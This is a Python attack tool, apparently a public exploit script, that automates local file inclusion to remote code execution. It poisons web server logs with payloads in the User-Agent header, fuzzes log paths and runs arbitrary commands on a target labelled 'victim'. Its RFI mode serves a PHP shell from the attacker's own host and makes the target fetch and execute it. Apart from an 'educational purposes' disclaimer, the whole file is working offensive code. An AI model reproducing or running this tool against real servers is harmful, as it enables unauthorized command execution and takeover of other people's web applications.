#!/usr/bin/env python3
# Author: coldtears
# For educational purposes only.
# References:
# https://www.thegeekstuff.com/2011/08/linux-var-log-files/    
# https://medium.com/@josewice7/lfi-to-rce-via-log-poisoning-db3e0e7a1cf1 
# https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/

import requests
import argparse
import re
import time
import os
from colorama import Fore, Style, init
import threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

init(autoreset=True)
logo = r"""
              _
   ___  ___  (_)__ ___  ___    ___  __ __
  / _ \/ _ \/ (_-</ _ \/ _ \_ / _ \/ // /
 / .__/\___/_/___/\___/_//_(_) .__/\_, /
/_/                         /_/   /___/
"""

color1 = '\033[38;2;240;240;240m'
color2 = '\033[38;2;210;210;210m'
color3 = '\033[38;2;180;180;180m'
reset = '\033[0m'

print(Fore.LIGHTGREEN_EX + logo)
print(f'{color1}by{reset} {color2}c0ld{reset}{color3}t3ars{reset} | version 1.3 stable')

def detect_query(url):
    match = re.search(r'\?([^#]+)', url)
    return match.group(1).split('&') if match else []

def parse_cookies(cookie_str):
    return dict(pair.strip().split("=", 1) for pair in cookie_str.split(";")) if cookie_str else {}

def exploit_log(url, log_path, cookies, cmd, payloads):
    session = requests.Session()
    
    try:
        base_url = url.split('?')[0]
        query_param = url.split('?')[1].split('=')[0]
    except IndexError:
        print(f"{Fore.RED}[!] invalid url format{Style.RESET_ALL}")
        return False

    for payload in payloads:
        payload = payload.strip()
        if not payload:
            continue

        headers = {"User-Agent": payload}
        print(f"{Fore.YELLOW}[+] poisoning with payload: {payload}{Style.RESET_ALL}")

        try:
            session.get(url, headers=headers, cookies=cookies, timeout=5)
            print(f"{Fore.GREEN}[+] poisoned successfully{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] poisoning failed: {e}{Style.RESET_ALL}")
            continue

        time.sleep(1.5)

        trigger_url = f"{base_url}?{query_param}={log_path}&cmd={cmd}"
        print(f"{Fore.YELLOW}[+] triggering command: {trigger_url}{Style.RESET_ALL}")

        try:
            resp = session.get(trigger_url, cookies=cookies, timeout=11)
            if 'shell:' in resp.text:
                print(f"{Fore.CYAN}[+] output:{Style.RESET_ALL}")
                print(resp.text.split('shell:')[-1])
                return True
            else:
                print(f"{Fore.RED}[!] no output received from payload, maybe trashed it?{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] trigger error: {e}{Style.RESET_ALL}")

    return False

def exploit_rfi(url, param, cookies, args):
    print(f"{Fore.YELLOW}[+] attempting RFI...{Style.RESET_ALL}")
    
    payload_file = os.path.basename(args.lfile)
    shell_url = f"http://{args.lhost}:{args.lport}/{payload_file}&cmd={args.exec}"

    try:
        if args.rfi and not os.path.isfile(args.lfile):
            print(f"{Fore.RED}[!] file '{args.lfile}' does not exist.{Style.RESET_ALL}")
            return        
        base_param = param.split('=')[0]
        rfi_url = url.replace(param, f"{base_param}={shell_url}")

        print(f"{Fore.CYAN}[i] delivering payload to: {rfi_url}{Style.RESET_ALL}")

        try:
            response = requests.get(rfi_url, cookies=cookies, timeout=10, allow_redirects=False)

            print(f"{Fore.CYAN}[info] headers: {dict(response.headers)}{Style.RESET_ALL}")

            if response.text.strip():
                print(f"{Fore.CYAN}[+] output from victim (raw):{Style.RESET_ALL}")
                print(response.text.strip())
                return True
            else:
                print(f"{Fore.RED}[!] no output returned from server.{Style.RESET_ALL}")

            return True

        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[!] request error: {e}{Style.RESET_ALL}")
            return False

    except Exception as e:
        print(f"{Fore.RED}[!] RFI error: {e}{Style.RESET_ALL}")
        return False

def start_local_server(port, args):
    
    class CustomHandler(SimpleHTTPRequestHandler):
        def translate_path(self, path):
            return args.lfile

        def do_GET(self):
            self.path = '/' + os.path.basename(args.lfile)
            return SimpleHTTPRequestHandler.do_GET(self)

    def run():
        server_address = ('0.0.0.0', port)
        try:
            httpd = HTTPServer(server_address, CustomHandler)
            print(f"{Fore.GREEN}[+] serving {args.lfile} on port {port}...{Style.RESET_ALL}")
            httpd.serve_forever()
        except Exception as e:
            print(f"{Fore.RED}[!] failed to start local server: port is busy or high{e}{Style.RESET_ALL}")

    thread = threading.Thread(target=run)
    thread.daemon = True
    thread.start()
    time.sleep(1)

def test_log(url, param, word, cookies, cmd, payloads):
    try:
        base_url = url.split('?')[0]
        key = param.split('=')[0]
        fuzzed_url = f"{base_url}?{key}={word}"

        res = requests.get(fuzzed_url, cookies=cookies, timeout=5)

        if any(kw in res.text for kw in ['Linux x86_64', 'User-Agent', 'Host:', 'Accept-Language']):
            print(f"{Fore.GREEN}[+] found log: {word}{Style.RESET_ALL}")
            if exploit_log(fuzzed_url, word, cookies, cmd, payloads):
                return True
    except Exception as e:
        return False
    return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-w', '--wordlist', default='src/wordlist.txt')
    parser.add_argument('--cookie', help='cookies for search')
    parser.add_argument('-e', '--exec', required=True, help='remote command to execute')
    parser.add_argument('-p', '--payloads', default='src/payloads.txt', help='list of payloads to inject via user-agent')
    parser.add_argument('--rfi', action='store_true', help='enable RFI mode')
    parser.add_argument('--lhost', required=False, default='127.0.0.1', help='host/ip to serve payload on (and victim will fetch)')
    parser.add_argument('--lport', type=int, default=14852, help='port to serve payload on (and victim will fetch)')
    parser.add_argument('--lfile', default='shell.php', help='local file to serve as payload (default: shell.php)')

    args = parser.parse_args()
    cookies = parse_cookies(args.cookie)

    print(f"{Fore.WHITE}[info] victim: {args.url}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[info] wordlist: {args.wordlist}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}[info] payloads: {args.payloads}{Style.RESET_ALL}")

    if args.rfi and not os.path.isfile(args.lfile):
        print(f"{Fore.RED}[!] file '{args.lfile}' does not exist.{Style.RESET_ALL}")
        return

    params = detect_query(args.url)
    if not params:
        print(f"{Fore.RED}[!] no query param found.{Style.RESET_ALL}")
        return

    if args.rfi:
        print(f"{Fore.YELLOW}[+] switching to RFI exploitation mode...{Style.RESET_ALL}")
        start_local_server(args.lport, args)
        for param in params:
            success = exploit_rfi(args.url, param, cookies, args)
            if success:
                print(f"{Fore.GREEN}[+] RFI triggered successfully!{Style.RESET_ALL}")
                return
        print(f"{Fore.RED}[!] RFI failed.{Style.RESET_ALL}")

    try:
        with open(args.wordlist) as f:
            words = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] wordlist not found: {args.wordlist}{Style.RESET_ALL}")
        return

    try:
        with open(args.payloads) as f:
            payloads = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] payloads file not found: {args.payloads}{Style.RESET_ALL}")
        return

    for word in words:
        for param in params:
            success = test_log(args.url, param, word, cookies, args.exec, payloads)
            if success:
                print(f"{Fore.GREEN}[+] success exploit!{Style.RESET_ALL}")
                return

    print(f"{Fore.RED}[!] no accessible log found, try a dif. wordlist.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
